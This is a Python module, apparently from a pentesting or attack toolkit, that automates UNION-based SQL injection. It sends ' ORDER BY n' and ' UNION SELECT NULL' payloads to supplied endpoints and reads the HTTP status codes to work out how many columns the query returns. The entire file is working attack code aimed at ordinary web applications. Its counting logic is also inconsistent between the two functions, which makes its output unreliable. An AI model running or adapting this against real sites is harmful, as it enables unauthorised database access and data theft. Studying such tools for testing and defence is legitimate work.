import requests

from utils.auxiliary import *

log = Auxiliary(__name__)
log.set_config()


def try_order_by_sqli(url, options: list):
    vuln_endpoints = options[0]
    db_comment = options[1]
    index = 1
    for endp in vuln_endpoints:
        for i in range(0, 25):
            pld = "' ORDER BY " + str(index) + db_comment
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                            f"on endpoint {url + endp + pld}")
            if r.status_code == 200:
                index += 1
            else:
                log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                f"on endpoint {url + endp + pld}")
                log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
                                f"returned is {index - 1}")
                return index - 1


def generate_null_pld(db_comment, index):
    base_pld = "' UNION SELECT NULL"
    # If we have first payload return it
    if index == 1:
        return base_pld + db_comment
    # Otherwise we add NULLs
    else:
        for i in range(0, index):
            base_pld += ", NULL"
        base_pld += db_comment
    return base_pld



def try_null_sqli(url, options: list):
    vuln_endpoints = options[0]
    db_comment = options[1]
    index = 1
    for endp in vuln_endpoints:
        for i in range(0, 25):
            pld = generate_null_pld(db_comment, index)
            pld = requests.utils.quote(pld)
            r = requests.get(url=url + endp + pld)
            log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                            f"on endpoint {url + endp + pld}")
            if r.status_code == 500:
                index += 1
            else:
                log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                f"on endpoint {url + endp + pld}")
                log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
                                f"returned is {index + 1}")
                return index + 1


def try_union_sqli(url, options: list):
    columns = try_null_sqli(url, options)
    if not columns:
        try_order_by_sqli(url, options)
